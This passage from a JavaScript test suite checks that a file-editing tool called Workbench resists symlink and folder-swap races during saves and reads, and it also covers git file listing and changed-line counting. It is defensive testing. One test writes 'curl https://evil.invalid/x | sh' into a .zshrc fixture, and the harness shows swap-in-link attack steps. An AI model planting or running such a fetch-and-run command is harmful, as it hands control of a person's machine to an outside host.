  assert.equal(fs.readFileSync(path.join(root, 'a.txt'), 'utf8'), 'the agent\n');
  assert.deepEqual(leftovers(root), []);
  // The same during a save the person makes anyway (force): it changed again, and says so.
  fsync.mock.mockImplementationOnce((fd) => {
    realFsync(fd);
    fs.writeFileSync(path.join(root, 'c.txt'), 'the agent again\n');
  });
  await assert.rejects(writeFile({ root, rel: 'c.txt', text: 'the person\n', hash: sha('one\n'), force: true }), e => {
    assert.equal(e.message, 'c.txt changed again, so nothing was written.');
    return e.plain === true && e.why === 'changed' && e.hash === sha('the agent again\n');
  });
  assert.equal(fs.readFileSync(path.join(root, 'c.txt'), 'utf8'), 'the agent again\n');
  assert.deepEqual(leftovers(root), []);
  // An agent puts a link in its place: nothing is written through it.
  fsync.mock.mockImplementationOnce((fd) => {
    realFsync(fd);
    fs.rmSync(path.join(root, 'b.txt'));
    fs.symlinkSync(path.join(outside, 'private.txt'), path.join(root, 'b.txt'));
  });
  await refused(writeFile({ root, rel: 'b.txt', text: 'the person\n', hash: sha('one\n') }), /is a link/);
  assert.equal(fs.readFileSync(path.join(outside, 'private.txt'), 'utf8'), 'outside the project\n');
  assert.equal(fs.lstatSync(path.join(root, 'b.txt')).isSymbolicLink(), true);
  assert.deepEqual(leftovers(root), []);
});

test('a folder swapped for a link to somewhere else while a save runs: nothing is written there', async (t) => {
  const { root } = repo({ 'src/x.txt': 'one\n' });
  const elsewhere = path.join(T, `elsewhere-${++made}`);
  fs.mkdirSync(elsewhere);
  fs.writeFileSync(path.join(elsewhere, 'x.txt'), 'one\n'); // even the same text as the file being saved
  const realFsync = fs.fsyncSync;
  t.mock.method(fs, 'fsyncSync').mock.mockImplementationOnce((fd) => {
    realFsync(fd);
    fs.renameSync(path.join(root, 'src'), path.join(root, 'src.moved'));
    fs.symlinkSync(elsewhere, path.join(root, 'src'));
  });
  await refused(writeFile({ root, rel: 'src/x.txt', text: 'the person\n', hash: sha('one\n') }), /moved while Workbench saved it/);
  assert.equal(fs.readFileSync(path.join(elsewhere, 'x.txt'), 'utf8'), 'one\n');
  assert.deepEqual(fs.readdirSync(elsewhere), ['x.txt']);
  assert.equal(fs.readFileSync(path.join(root, 'src.moved', 'x.txt'), 'utf8'), 'one\n');
  assert.deepEqual(leftovers(path.join(root, 'src.moved')), []);
});

test('a save stands in the file’s folder: a folder swapped for a link at any step sends nothing elsewhere', async (t) => {
  const cwd = process.cwd();
  // Somewhere the person can write, with a file of the same name: their own shell setup, or the repository's config.
  const home = path.join(T, `home-${++made}`);
  fs.mkdirSync(home);
  fs.writeFileSync(path.join(home, '.zshrc'), 'echo the person’s own shell setup\n');
  const { root } = repo({ 'src/.zshrc': 'echo project\n', 'lib/config': 'project config\n' });
  const gitConfig = fs.readFileSync(path.join(root, '.git', 'config'));
  const cases = [
    { folder: 'src', name: '.zshrc', elsewhere: home, theirs: 'echo the person’s own shell setup\n', mine: 'echo project\n' },
    { folder: 'lib', name: 'config', elsewhere: path.join(root, '.git'), theirs: gitConfig, mine: 'project config\n' },
  ];
  const fired = { open: 0, fsync: 0, rename: 0, chdir: 0 };
  let swap = null;
  t.mock.method(fs, 'openSync', function (p, flags, ...rest) {
    if (swap && flags === 'wx' && String(p).includes('.workbench-save-')) {
      fired.open++;
      swap.toLink(); // before the temporary file is made
    }
    return REAL.openSync(p, flags, ...rest);
  });
  t.mock.method(fs, 'fsyncSync', function (fd) {
    REAL.fsyncSync(fd);
    if (swap && fired.open > fired.fsync) {
      fired.fsync++;
      swap.back(); // back before the last look
    }
  });
  t.mock.method(fs, 'renameSync', function (from, to) {
    if (swap && String(from).includes('.workbench-save-')) {
      fired.rename++;
      swap.toLink(); // and again before the rename
    }
    return REAL.renameSync(from, to);
  });
  for (const c of cases) {
    const rel = `${c.folder}/${c.name}`;
    const was = { ...fired };
    swap = swapper(root, c.folder, c.elsewhere);
    let saved;
    try {
      saved = await writeFile({ root, rel, text: 'curl https://evil.invalid/x | sh\n', hash: sha(c.mine) });
    } finally {
      swap.back();
      swap = null;
    }
    assert.deepEqual([fired.open - was.open, fired.fsync - was.fsync, fired.rename - was.rename], [1, 1, 1], rel);
    // What was elsewhere is untouched, and nothing of the save's is left there.
    assert.deepEqual(fs.readFileSync(path.join(c.elsewhere, c.name)), Buffer.from(c.theirs), rel);
    assert.deepEqual(leftovers(c.elsewhere), [], rel);
    // The save went where Workbench stood: the folder the person opened, wherever it was at that moment.
    assert.deepEqual(saved, { hash: sha('curl https://evil.invalid/x | sh\n'), size: 33 });
    assert.equal(fs.readFileSync(path.join(root, rel), 'utf8'), 'curl https://evil.invalid/x | sh\n', rel);
    assert.deepEqual(leftovers(path.join(root, c.folder)), [], rel);
    assert.equal(process.cwd(), cwd, 'Workbench is back where it was');
  }
  assert.deepEqual(fs.readFileSync(path.join(root, '.git', 'config')), gitConfig);

  // Swapped between the check of the path and the step into the folder: Workbench lands elsewhere, sees it, and stops.
  put(root, { 'src/.zshrc': 'echo project\n' });
  const realSrc = fs.realpathSync.native(path.join(root, 'src'));
  t.mock.method(process, 'chdir', function (dir) {
    if (swap && dir === realSrc) {
      fired.chdir++;
      const once = swap;
      swap = null;
      once.toLink();
    }
    return REAL.chdir(dir);
  });
  const s = swapper(root, 'src', home);
  swap = s;
  try {
    await refused(writeFile({ root, rel: 'src/.zshrc', text: 'curl https://evil.invalid/x | sh\n', hash: sha('echo project\n') }),
      /^The folder that holds src\/\.zshrc moved while Workbench saved it, so nothing was written\.$/);
  } finally {
    s.back();
    swap = null;
  }
  assert.equal(fired.chdir, 1);
  assert.equal(fs.readFileSync(path.join(home, '.zshrc'), 'utf8'), 'echo the person’s own shell setup\n');
  assert.equal(fs.readFileSync(path.join(root, 'src', '.zshrc'), 'utf8'), 'echo project\n');
  assert.deepEqual([...leftovers(home), ...leftovers(path.join(root, 'src'))], []);
  assert.equal(process.cwd(), cwd, 'Workbench is back where it was after a refusal too');
});

test('reading stands in the file’s folder too: a folder swapped for a link never shows what is elsewhere', async (t) => {
  const cwd = process.cwd();
  const keys = path.join(T, `keys-${++made}`);
  fs.mkdirSync(keys);
  fs.writeFileSync(path.join(keys, 'id_ed25519'), 'OUTSIDE PRIVATE KEY\n');
  const { root } = repo({ 'src/id_ed25519': 'not a key, a test fixture\n', 'lib/config': 'project config\n' });
  let swap = null; // the swap still to make, once
  const fire = () => {
    const s = swap;
    swap = null;
    s.toLink();
  };
  let looked = 0;
  // Swapped once Workbench has checked the path, as it looks at the file.
  t.mock.method(fs, 'lstatSync', function (p, ...rest) {
    if (swap && /(?:^|\/)(?:id_ed25519|config)$/.test(String(p))) {
      looked++;
      fire();
    }
    return REAL.lstatSync(p, ...rest);
  });
  const cases = [['src', 'id_ed25519', keys, 'not a key, a test fixture\n'], ['lib', 'config', path.join(root, '.git'), 'project config\n']];
  for (const [folder, name, elsewhere, mine] of cases) {
    const s = swapper(root, folder, elsewhere);
    swap = s;
    let got;
    try {
      got = await readFile({ root, rel: `${folder}/${name}` });
    } finally {
      s.back();
      swap = null;
    }
    assert.equal(got.kind, 'text');
    assert.equal(got.text, mine);
    assert.equal(process.cwd(), cwd);
  }
  assert.equal(looked, 2);

  // Swapped between the check of the path and the step into the folder: refused, and nothing is read.
  const realSrc = fs.realpathSync.native(path.join(root, 'src'));
  let stepped = 0;
  t.mock.method(process, 'chdir', function (dir) {
    if (swap && dir === realSrc) {
      stepped++;
      fire();
    }
    return REAL.chdir(dir);
  });
  const s = swapper(root, 'src', keys);
  swap = s;
  try {
    await refused(readFile({ root, rel: 'src/id_ed25519' }), /^The folder that holds src\/id_ed25519 moved while Workbench read it\.$/);
  } finally {
    s.back();
    swap = null;
  }
  assert.equal(stepped, 1);
  assert.equal(process.cwd(), cwd);
});

test('changedLines counts the lines of the file it read itself, standing in its folder, never of a second look', async (t) => {
  const { root, since } = repo({ 'a.txt': 'a\n' });
  put(root, { 'src/u.txt': '1\n2\n' }); // never added: new altogether
  const far = path.join(T, `far-${++made}`);
  fs.mkdirSync(far);
  fs.writeFileSync(path.join(far, 'u.txt'), Array.from({ length: 50 }, (_, i) => `${i + 1}\n`).join(''));
  const s = swapper(root, 'src', far);
  let looks = 0;
  t.mock.method(fs, 'lstatSync', function (p, ...rest) {
    if (/(?:^|\/)u\.txt$/.test(String(p)) && ++looks === 2) s.toLink(); // a second look at the file finds the link
    return REAL.lstatSync(p, ...rest);
  });
  let got;
  try {
    got = await changedLines({ root, since, rel: 'src/u.txt' });
  } finally {
    s.back();
  }
  assert.ok(looks >= 1);
  assert.deepEqual(got, [1, 2]);
});

test('changedLines gives only lines of the file it read, though git reads the file again by its path', async (t) => {
  const { root, since } = repo({ 'a.txt': '1\n2\n3\n' });
  put(root, { 'a.txt': '1\nTWO\n3\n' });
  // Once Workbench has read the file, an agent makes it longer (or swaps its folder for a link), before git looks.
  const realClose = fs.closeSync;
  t.mock.method(fs, 'closeSync').mock.mockImplementationOnce((fd) => {
    realClose(fd);
    fs.writeFileSync(path.join(root, 'a.txt'), '1\nTWO\n3\n4\n5\n');
  });
  assert.deepEqual(await changedLines({ root, since, rel: 'a.txt' }), [2]);
  assert.match(git(root, 'diff', '-U0', since), /^@@ -3,0 \+4,2 @@$/m, 'git saw the longer file');
});

test('the temporary file is made only where nothing is, not even a link', async (t) => {
  const { root } = repo({ 'a.txt': 'one\n' });
  t.mock.method(crypto, 'randomBytes', () => Buffer.alloc(8, 0xab));
  const planted = path.join(root, '.a.txt.workbench-save-abababababababab');
  fs.symlinkSync(path.join(outside, 'private.txt'), planted);
  await refused(writeFile({ root, rel: 'a.txt', text: 'two\n', hash: sha('one\n') }), /^Workbench could not save a\.txt\.$/);
  assert.equal(fs.readFileSync(path.join(outside, 'private.txt'), 'utf8'), 'outside the project\n');
  assert.equal(fs.readFileSync(path.join(root, 'a.txt'), 'utf8'), 'one\n');
  assert.equal(fs.lstatSync(planted).isSymbolicLink(), true, 'what was there before is left alone');
});

test('a long file name still gets a temporary name that fits', async () => {
  const name = `${'n'.repeat(240)}.txt`;
  const { root } = repo({ [name]: 'one\n' });
  await writeFile({ root, rel: name, text: 'two\n', hash: sha('one\n') });
  assert.equal(fs.readFileSync(path.join(root, name), 'utf8'), 'two\n');
  assert.deepEqual(leftovers(root), []);
});

test('a path asked for in another case or Unicode form reaches the file as it is on disk, and a save keeps its name', async () => {
  const folder = 'Café'; // decomposed, as some programs write names
  const { root } = repo({ [`${folder}/Notes.txt`]: 'one\n' });
  const real = path.join(root, folder);
  let saved = 0;
  for (const rel of [`${folder}/Notes.txt`, 'Café/Notes.txt', 'café/NOTES.TXT', 'CAFÉ/notes.txt']) {
    if (!fs.existsSync(path.join(root, rel))) continue; // a file system that tells cases and forms apart: no such file
    const got = await readFile({ root, rel });
    assert.equal(got.kind, 'text', rel);
    const text = `${got.text}${++saved}\n`;
    await writeFile({ root, rel, text, hash: got.hash });
    assert.deepEqual(fs.readdirSync(real), ['Notes.txt'], `${JSON.stringify(rel)}: the file keeps its name, and nothing is left`);
    assert.equal(fs.readFileSync(path.join(real, 'Notes.txt'), 'utf8'), text);
  }
  assert.ok(saved >= 1);
});

test('a save cut short leaves its sibling: the list leaves it out, and a later save in that folder removes it once it is old', async () => {
  for (const yes of ['.a.txt.workbench-save-0123456789abcdef', 'src/.b.js.workbench-save-00112233445566ff', '.x.workbench-save-ffffffffffffffff']) {
    assert.equal(isSaveFile(yes), true, yes);
  }
  for (const no of ['a.txt', 'a.txt.workbench-save-0123456789abcdef', '.a.txt.workbench-save-0123', '.a.txt.workbench-save-0123456789ABCDEF',
    '.workbench-save-0123456789abcdef', '.a.workbench-save-0123456789abcdef/inner.txt', '.a.txt.workbench-save-0123456789abcdef.bak']) {
    assert.equal(isSaveFile(no), false, no);
  }
  const { root } = repo({ 'a.txt': 'one\n', 'src/b.js': 'b\n' });
  const hourAgo = new Date(Date.now() - 60 * 60_000);
  const old = '.a.txt.workbench-save-0123456789abcdef'; // a save of a.txt, cut short an hour ago
  const fresh = '.a.txt.workbench-save-fedcba9876543210'; // one that may still be under way
  const oldLink = '.l.workbench-save-aaaaaaaaaaaaaaaa';
  const oldFolder = '.d.workbench-save-bbbbbbbbbbbbbbbb';
  const elsewhere = 'src/.b.js.workbench-save-00112233445566ff'; // in another folder
  put(root, { [old]: 'half of the person’s te', [fresh]: 'the person’s text, being written', [elsewhere]: 'b, half' });
  fs.symlinkSync(path.join(outside, 'private.txt'), path.join(root, oldLink));
  fs.mkdirSync(path.join(root, oldFolder));
  for (const rel of [old, oldFolder, elsewhere]) fs.utimesSync(path.join(root, rel), hourAgo, hourAgo);
  fs.lutimesSync(path.join(root, oldLink), hourAgo, hourAgo);
  assert.deepEqual((await listFiles({ root })).files, ['a.txt', 'src/b.js']);

  await writeFile({ root, rel: 'a.txt', text: 'two\n', hash: sha('one\n') });
  assert.equal(fs.readFileSync(path.join(root, 'a.txt'), 'utf8'), 'two\n');
  assert.equal(fs.existsSync(path.join(root, old)), false, 'an old sibling is removed');
  assert.equal(fs.readFileSync(path.join(root, fresh), 'utf8'), 'the person’s text, being written');
  assert.equal(fs.lstatSync(path.join(root, oldLink)).isSymbolicLink(), true, 'only regular files are removed');
  assert.equal(fs.lstatSync(path.join(root, oldFolder)).isDirectory(), true);
  assert.equal(fs.readFileSync(path.join(root, elsewhere), 'utf8'), 'b, half', 'only in the folder of the file saved');
  assert.equal(fs.readFileSync(path.join(outside, 'private.txt'), 'utf8'), 'outside the project\n');
});

// ------------------------------------------------------------------ the list

test('the list holds tracked files and new ones, as .gitignore says, tracked first when it is cut', async () => {
  const { root } = repo({ '.gitignore': '*.log\nbuild/\n', 'a.txt': 'a\n', 'src/b.js': 'b\n' });
  put(root, { 'keep.log': 'kept\n' });
  git(root, 'add', '-f', 'keep.log'); // tracked, though the rules would hide it
  put(root, { 'new.js': 'n\n', 'debug.log': 'd\n', 'build/out.js': 'o\n', 'notes/todo.md': 't\n' });
  const nested = path.join(root, 'nested');
  fs.mkdirSync(nested);
  git(nested, 'init', '-q', '-b', 'main');
  put(nested, { 'inner.txt': 'i\n' });
  assert.deepEqual(await listFiles({ root }), { files: ['.gitignore', 'a.txt', 'keep.log', 'new.js', 'notes/todo.md', 'src/b.js'] });
  // Cut short: tracked files come first, then the order is by path.
  assert.deepEqual(await listFiles({ root, max: 4 }), { files: ['.gitignore', 'a.txt', 'keep.log', 'src/b.js'], truncated: true });
  assert.deepEqual(await listFiles({ root, max: 5 }), { files: ['.gitignore', 'a.txt', 'keep.log', 'new.js', 'src/b.js'], truncated: true });
  // A file deleted by hand is still tracked; a file in a conflict is listed once.
  fs.rmSync(path.join(root, 'a.txt'));
  assert.ok((await listFiles({ root })).files.includes('a.txt'));
  await refused(listFiles({ root: path.join(T, 'no-such-folder') }), /does not exist/);
  const plain = path.join(T, 'not-a-repo');
  fs.mkdirSync(plain);
  await refused(listFiles({ root: plain }), /^Git could not list the files in .*not-a-repo\.$/);
});

test('a file in a conflict is listed once', async () => {
  const { root } = repo({ 'c.txt': 'base\n' });
  git(root, 'checkout', '-q', '-b', 'other');
  put(root, { 'c.txt': 'theirs\n' });
  git(root, 'commit', '-q', '-am', 'theirs');
  git(root, 'checkout', '-q', 'main');
  put(root, { 'c.txt': 'ours\n' });
  git(root, 'commit', '-q', '-am', 'ours');
  assert.throws(() => git(root, 'merge', '-q', 'other'));
  assert.deepEqual((await listFiles({ root })).files, ['c.txt']);
});

test('when git’s list of new files is more than Workbench reads at once, the list is cut, not refused', async (t) => {
  const { root } = repo({ 'a.txt': 'a\n', 'src/b.js': 'b\n' });
  // A stand-in for git that answers `ls-files --others` with more than 64 MB of names (an agent's copy with a
  // node_modules no rule hides, say), `ls-files --cached` too while a marker file is there, and hands everything else
  // to the real git.
  const realGit = process.env.PATH.split(path.delimiter).map(d => path.join(d, 'git')).find(p => fs.existsSync(p));
  const bin = path.join(T, `bin-${++made}`);
  fs.mkdirSync(bin);
  const names = path.join(bin, 'names');
  const floodTracked = path.join(bin, 'flood-tracked');
  const name = n => `new/${String(n).padStart(7, '0')}-${'n'.repeat(1388)}`; // 1400 bytes with its NUL
  const count = 50_000; // 70 MB
  fs.writeFileSync(names, Array.from({ length: count }, (_, n) => `${name(n)}\0`).join(''));
  fs.writeFileSync(path.join(bin, 'git'), [
    '#!/bin/sh',
    'for a in "$@"; do',
    `  if [ "$a" = "--others" ]; then exec cat '${names}'; fi`,
    `  if [ "$a" = "--cached" ] && [ -e '${floodTracked}' ]; then exec cat '${names}'; fi`,
    'done',
    `exec '${realGit}' "$@"`,
  ].join('\n') + '\n', { mode: 0o755 });
  const PATH = process.env.PATH;
  process.env.PATH = `${bin}${path.delimiter}${PATH}`;
  t.after(() => { process.env.PATH = PATH; });

  const all = await listFiles({ root });
  assert.equal(all.truncated, true);
  assert.deepEqual(all.files.slice(0, 2), ['a.txt', 'new/0000000-' + 'n'.repeat(1388)]);
  assert.ok(all.files.includes('src/b.js'), 'every tracked file is there');
  const fresh = all.files.filter(f => f.startsWith('new/'));
  assert.ok(fresh.length > 1000 && fresh.length < count, `${fresh.length} new files`);
  assert.ok(fresh.every((f, k) => f === name(k)), 'only names that came whole, in order');
  assert.deepEqual(await listFiles({ root, max: 3 }), { files: ['a.txt', name(0), 'src/b.js'], truncated: true });
  // The tracked files are the list's start: when git cannot give them whole, the list is refused, not shown cut.
  fs.writeFileSync(floodTracked, '');
  await refused(listFiles({ root }), /^Git gave back more than Workbench can read at once\.$/);
});

// ------------------------------------------------------------------ changed lines

test('changedLines: the lines of the current file that the work since a commit added or changed', async () => {
  // A NUL past git's first 8000 bytes: git diffs it as text, and the view calls it binary, so it has no lines.
  const lateNul = Buffer.concat([Buffer.from(`${'a'.repeat(9000)}\nx\n`), Buffer.from([0]), Buffer.from('\ny\n')]);
  const { root, since } = repo({
    'a.txt': 'one\ntwo\nthree\n', 'same.txt': 'same\n', 'del.txt': '1\n2\n3\n', 'win.txt': 'a\r\nb\r\n',
    'logo.png': Buffer.from([0x89, 0x50, 0x00, 0x01]), '.gitignore': '*.log\n', 'src/b.js': 'let b = 1;\nexport default b;\n',
    'late.txt': lateNul,
  });
  // A commit after `since`, then changes not committed: both count.
  put(root, { 'a.txt': 'ONE\ntwo\nthree\n' });
  git(root, 'commit', '-q', '-am', 'the agent, first');
  put(root, {
    'a.txt': 'ONE\ntwo\nTHREE\nfour\n', 'del.txt': '1\n3\n', 'win.txt': 'a\r\nB\r\n', 'logo.png': Buffer.from([0x89, 0x50, 0x00, 0x02]),
    'src/b.js': 'let b = 2;\nexport default b;\n', 'late.txt': Buffer.concat([lateNul, Buffer.from('z\n')]),
  });
  put(root, { 'added.js': 'x\ny\n' });
  git(root, 'add', 'added.js');
  put(root, { 'fresh.js': 'a\nb\nc', 'empty-new.txt': '', 'debug.log': 'one\ntwo\n' });
  fs.symlinkSync('src', path.join(root, 'lib'));
  const lines = rel => changedLines({ root, since, rel });
  assert.deepEqual(await lines('a.txt'), [1, 3, 4]);
  assert.deepEqual(await lines('same.txt'), []);
  assert.deepEqual(await lines('del.txt'), []); // only taken away: no line of the current file is new
  assert.deepEqual(await lines('win.txt'), [2]);
  assert.deepEqual(await lines('logo.png'), []);
  assert.equal((await readFile({ root, rel: 'late.txt' })).kind, 'binary');
  assert.match(git(root, 'diff', '-U0', since, '--', 'late.txt'), /^\+z$/m, 'git itself diffs it as text');
  assert.deepEqual(await lines('late.txt'), []);
  assert.deepEqual(await lines('added.js'), [1, 2]);
  assert.deepEqual(await lines('fresh.js'), [1, 2, 3]); // never added: all of it is new, as the git screen says
  assert.deepEqual(await lines('empty-new.txt'), []);
  assert.deepEqual(await lines('debug.log'), []); // hidden by .gitignore: not work
  assert.deepEqual(await lines('lib/b.js'), [1]); // through a folder link: the real file's lines
  assert.deepEqual(await lines('lib'), []); // a link itself has no lines
  assert.deepEqual(await lines('gone.txt'), []);
  // A line that only looks like a header of git's is still a line.
  put(root, { 'same.txt': 'same\n++ looks like a header\n--- so does this\n' });
  assert.deepEqual(await lines('same.txt'), [2, 3]);
  await refused(changedLines({ root, since: 'HEAD', rel: 'a.txt' }), /^Workbench does not know which commit its work started from\.$/);
  await refused(changedLines({ root, rel: 'a.txt' }), /does not know which commit/);
  await refused(changedLines({ root, since: 'deadbeef'.repeat(5), rel: 'a.txt' }), /^The commit its work started from is no longer in this repository\.$/);
});

test('changedLines in an agent’s worktree, against the commit it started from', async () => {
  const { root, since } = repo({ 'export.ts': 'a\nb\nc\n' });
  const ws = path.join(T, `ws-${++made}`);
  git(root, 'worktree', 'add', '-q', '-b', 'workbench/export-a1', ws, 'HEAD');
  put(ws, { 'export.ts': 'a\nB\nc\nd\n', 'new.ts': 'n\n' });
  assert.deepEqual(await changedLines({ root: ws, since, rel: 'export.ts' }), [2, 4]);
  assert.deepEqual(await changedLines({ root: ws, since, rel: 'new.ts' }), [1]);
  assert.deepEqual(await changedLines({ root, since, rel: 'export.ts' }), []); // the person's folder is untouched
  assert.deepEqual((await listFiles({ root: ws })).files, ['export.ts', 'new.ts']);
  await refused(readFile({ root: ws, rel: '.git' }), /git’s own folder/); // a worktree's .git is a file
});

test('changedLines: a file the work took out of git but kept is compared with the commit it started from, as the git screen does', async () => {
  const eight = Array.from({ length: 8 }, (_, i) => `line ${i + 1}`).join('\n') + '\n';
  const { root, since } = repo({ 'untracked-again.js': eight, 'rm-then-rewrite.js': eight, 'was-a-folder/inner.txt': 'x\n', 'keep.js': 'k\n' });
  const ws = path.join(T, `ws-${++made}`);
  git(root, 'worktree', 'add', '-q', '-b', 'workbench/probe-2', ws, 'HEAD');
  git(ws, 'rm', '-q', '--cached', 'untracked-again.js'); // still there, unchanged, and no rule hides it
  git(ws, 'rm', '-q', 'rm-then-rewrite.js');
  put(ws, { 'rm-then-rewrite.js': eight.replace('line 5', 'line FIVE') });
  git(ws, 'rm', '-rq', 'was-a-folder');
  put(ws, { 'was-a-folder': 'a\nb\nc\n' }); // a file where a folder was: new
  assert.match(git(ws, 'status', '--porcelain'), /^\?\? untracked-again\.js$/m);
  const lines = rel => changedLines({ root: ws, since, rel });
  assert.deepEqual(await lines('untracked-again.js'), []);
  assert.deepEqual(await lines('rm-then-rewrite.js'), [5]);
  assert.deepEqual(await lines('was-a-folder'), [1, 2, 3]);
  // The same once the removals are committed.
  git(ws, 'commit', '-q', '-m', 'untracked');
  assert.deepEqual(await lines('untracked-again.js'), []);
  assert.deepEqual(await lines('rm-then-rewrite.js'), [5]);
  // The scratch index it compared with is gone, and the agent's own index is as it was.
  const tmp = path.join(process.env.HOME, '.workbench', 'tmp');
  assert.deepEqual(fs.existsSync(tmp) ? fs.readdirSync(tmp).filter(n => n.startsWith('workbench-index-')) : [], []);
  assert.equal(git(ws, 'ls-files'), 'keep.js');
});
